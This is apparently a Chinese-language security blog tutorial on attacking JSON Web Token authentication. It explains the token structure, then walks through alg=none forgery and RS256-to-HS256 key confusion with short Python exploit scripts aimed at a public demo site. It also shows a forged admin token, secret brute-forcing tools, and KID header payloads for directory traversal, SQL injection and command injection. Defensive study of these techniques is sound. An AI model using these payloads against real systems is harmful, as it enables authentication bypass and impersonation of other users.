---
title: "JWT 鉴权攻击"
slug: attacking-jwt-authentication
aliases: ["/2021/attacking-jwt-authentication.html"]
date: 2021-02-15 12:50:05
categories: ["网络安全"]
tags: ["JWT"]
toc: true
draft: false
---

Json Web Token 简称 JWT，是一种基于 json 格式传输信息的 token 鉴权方式。目前应用较为广泛，Web 登陆认证以及 CTF 中也时常遇到。由于它的无状态和签名方式，因此存在一些特定于 JWT 的安全性问题。这篇文章介绍几种 JWT 鉴权攻击方法。

## JWT 数据结构

JWT 由三部分组成，这些部分中间以 `.` 号分隔，分别是：

* Header（头部）
* Payload（有效载荷）
* Signature（签名）

因此 JWT 通常格式为：

```
base64UrlEncode(Header). base64UrlEncode(Payload).Signature
```

其中 Header 与 Payload 以明文经 Base64Url 编码存储。

一段在 <https://jwt.io/> 生成的 JWT 如下：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InpqdW4iLCJpYXQiOjE1MTYyMzkwMjJ9.nND9JmdF_kAXhJuJkGo8ss_Fx34zpY8xGt6FcB6qFIc
```

下面让我们将其分解加以解析。

### Header

Header 通常由两部分组成：令牌的类型 `typ`（即 JWT）和所使用的签名算法 `alg`（例如 HS256、RS256）。

上面一段 JWT 的第一部分是：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

经 Base64Url 解码如下：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload

Payload 用来承载要传递的数据，它的 json 结构实际上是对 JWT 要传递的数据的一组声明，这些声明被 JWT 标准称为 claims，它的一个”属性值对“就是一个 claim，每一个 claim 都代表特定的含义和作用。

claims 有三种类型分别是：Registered claims、Public claims、Private claims。

详细可见：<https://jwt.io/introduction/>

上面一段 JWT 的第二部分是：

```
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InpqdW4iLCJpYXQiOjE1MTYyMzkwMjJ9
```

经 Base64Url 解码如下：

```json
{
  "sub": "1234567890",
  "name": "zjun",
  "iat": 1516239022
}
```

### Signature

要创建签名部分，必须获取编码的 header，编码的 payload，加密密钥（secret），header 中指定的算法，并对其进行签名。

例如，如果要使用 `HS256` 算法，则将通过以下方式创建签名：

```java
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

签名用于验证数据在发送过程中没有被篡改。

上面一段 JWT 的 signature 部分是：

```
nND9JmdF_kAXhJuJkGo8ss_Fx34zpY8xGt6FcB6qFIc
```

## JWT 攻击实现

### 敏感信息泄漏

通过 JWT 数据结构的分析，显然可知：header 与 payload 是以明文经 Base64Url 编码传输的，因此，如果 payload 中存在敏感信息的话，就会发生信息泄露。

### 更改签名算法

JWT 签名算法用以防止用户篡改其中的数据。例如使用 HMAC 或 RSA 签名。JWT 的 header 包含用于对 JWT 进行签名的算法，某些算法的一个缺点是，即使客户端可以操纵它，它们也信任此 JWT 标头。如果存在此漏洞，则客户端可以创建自己的令牌。

#### 将 alg 设置为 None

签名算法可以确保 JWT 在传输过程中不会被恶意用户所篡改。但 header 头部中的 `alg` 字段却可以改为 `none` 。另外，一些 JWT 库也支持 `none` 算法，即不使用签名算法。将 `alg` 设置为 `none` ，告诉服务器不进行签名校验。

将 alg 字段改为 none 后，系统就会从 JWT 中删除相应的签名数据。这时，JWT 就是 `base64UrlEncode(header). base64UrlEncode(payload).` ，然后将其提交给服务器。

一个演示项目实例：<https://github.com/Sjord/jwtdemo>

HS256 演示页面：<http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php>

Exploit:

```python
import base64
# header
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
# {"typ":"JWT","alg":"HS256"}
# payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxMzM1OTI1OSwiZXhwIjoxNjEzMzYwNDU5LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
# {"iss": "http://demo.sjoerdlangkemper.nl/","iat": 1613359259,"exp": 1613360459,"data": {"hello": "world"}}
def b64urlencode(data):
    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')

print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
```

传入后结果如下，通过验证：

![alg=none](https://oss.zjun.info/zjun.info/20210215000306.png)

#### 将 alg 由 RS256 更改为 HS256

HS256 算法使用密钥来为每个消息进行签名和验证。RS256 算法使用私钥对消息进行签名，并使用公钥进行验证。如果我们将算法从 RS256 更改为 HS256，则将使用公钥作为私钥使用 HS256 算法验证签名，则后端代码使用 RSA 公钥 +HS256 算法进行签名验证。由于公钥是公开的，因此我们可以正确签署这类消息。

相同，我们也可以使用演示实例：<https://github.com/Sjord/jwtdemo>

RS256 演示页面：<http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php>

RSA 公钥：<http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem>

Exploit:

```python
import jwt
# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
# {"typ": "JWT","alg": "RS256"}
# eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxMzM1OTA5NiwiZXhwIjoxNjEzMzYwMjk2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
# {"iss": "http://demo.sjoerdlangkemper.nl/","iat": 1613359096,"exp": 1613360296,"data": {"hello": "world"}}
public = open('public.pem', 'r').read()
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

理论可行，但是实际未成功，可能是公钥处理的问题。

### 无效签名

当用户端提交请求给应用程序，服务端可能没有对签名部分进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制，当然这种情况极少。

下面一段 JWT：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImFjdGlvbiI6InByb2ZpbGUifQ.FjnAvQxzRKcahlw2EPd9o7teqX-fQSt7MZhT84hj7mU
```

payload 部分为

```json
{
  "user": "test",
  "action": "profile"
}
```

若存在无效签名的话，即直接修改 user 字段，便可伪造其他用户：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhY3Rpb24iOiJwcm9maWxlIn0._LRRXAfXtnagdyB1uRk-7CfkK1RESGwxqQCdwCNSPaI
```

### 爆破签名密钥

针对于 HS256 对称加密算法，如果 HS256 密钥的强度较弱的话，攻击者可以直接通过暴力破解的攻击方式来得到密钥。具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。

例如 CISCN2019 华北赛区 Day1 Web2 ikun 一题中就有利用爆破 JWT 密钥进行伪造 token。

解题过程见：<https://blog.zjun.info/2019/ikun.html>

爆破工具：[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)、[jwt_tool](https://github.com/ticarpi/jwt_tool)或[JWTPyCrack](https://github.com/Ch1ngg/JWTPyCrack)

在线 JWT 加解密网站：<https://jwt.io/>

### 密钥泄露

假设攻击者无法暴力破解密钥，那么他可能通过其他途径获取密钥，如 git 信息泄露、目录遍历，任意文件读取、XXE 漏洞等，从而伪造任意 token 签名。

### 可控头部参数

#### KID 头部参数

KID 代表"密钥 ID"即"Key ID"。它是 JWT 中的可选头部字段，它使开发人员可以指定用于验证 token 的密钥。KID 参数的正确用法如下所示：

```json
{
  "alg"："HS256",
  "typ"："JWT",
  "kid"："1" //使用密钥 1 来验证令牌
}
```

由于此字段是由用户控制的，因此攻击者可能会操纵它并导致危险的后果。

##### 目录遍历

由于 KID 通常用于从文件系统中检索密钥文件，因此，如果在使用前未对其进行清理，则可能导致目录遍历攻击。在这种情况下，攻击者将能够在文件系统中指定任何文件作为用于验证令牌的密钥。

```json
"kid": "../../public/css/main.css"
//使用公共文件 main.css 验证 token
```

例如，攻击者可以迫使应用程序使用公开可用的文件作为密钥，并使用该文件对 HMAC 令牌进行签名。

##### SQL 注入

KID 还可以用于从数据库检索密钥。在这种情况下，可能可以利用 SQL 注入来绕过 JWT 签名。如果可以在 KID 参数上进行 SQL 注入，则攻击者可以使用该注入返回她想要的任何值。

```json
"kid":"aaaaaaa' UNION SELECT 'key';--"
//使用字符串"key"验证 token
```

例如，上面的注入将使应用程序返回字符串"key"（因为数据库中不存在名为"aaaaaaa"的键）。然后将使用字符串"key"作为密钥来验证令牌。

##### 命令注入

有时，当 KID 参数直接传递到不安全的文件读取操作中时，可以将命令注入代码流中。

可能允许这种类型的攻击的函数之一是 `Ruby open()` 函数。此功能使攻击者只需在 KID 文件名之后将命令添加到输入即可，即可执行系统命令：

```json
"key_file" | whoami;
```

这只是一个例子。从理论上讲，每当应用程序将未经过滤审查的任何头文件参数传递给类似于 `system()` ， `exec()` 等的任何函数时，就会发生此类漏洞。

#### JKU 头部参数

JWKSet URL 即 JKU。它是一个可选的头部字段，用于指定指向一组用于验证 token 密钥的 URL。如果允许该字段，并且没有适当地限制此字段，则攻击者可以托管自己的密钥文件，并指定应用程序使用它来验证 token。

```json
jku URL->包含 JWK 集的文件->用于验证 token 的 JWK
```

#### JWK 头部参数

可选的 JWK（JSON Web Key）标头参数允许攻击者将用于验证 token 的密钥直接嵌入 token 中。

#### X5U、X5C URL 操作

类似于 JKU 和 JWK 头部参数，X5U 和 X5C 标头参数允许攻击者指定用于验证 token 的公钥证书或证书链。X5U 以 URI 形式指定信息，而 X5C 允许将证书值嵌入 token 中。

## 参考

* <https://jwt.io/introduction/>

* <https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/>

* <https://xz.aliyun.com/t/2338>

* <https://en.wikipedia.org/wiki/JSON_Web_Token>

* <https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a>
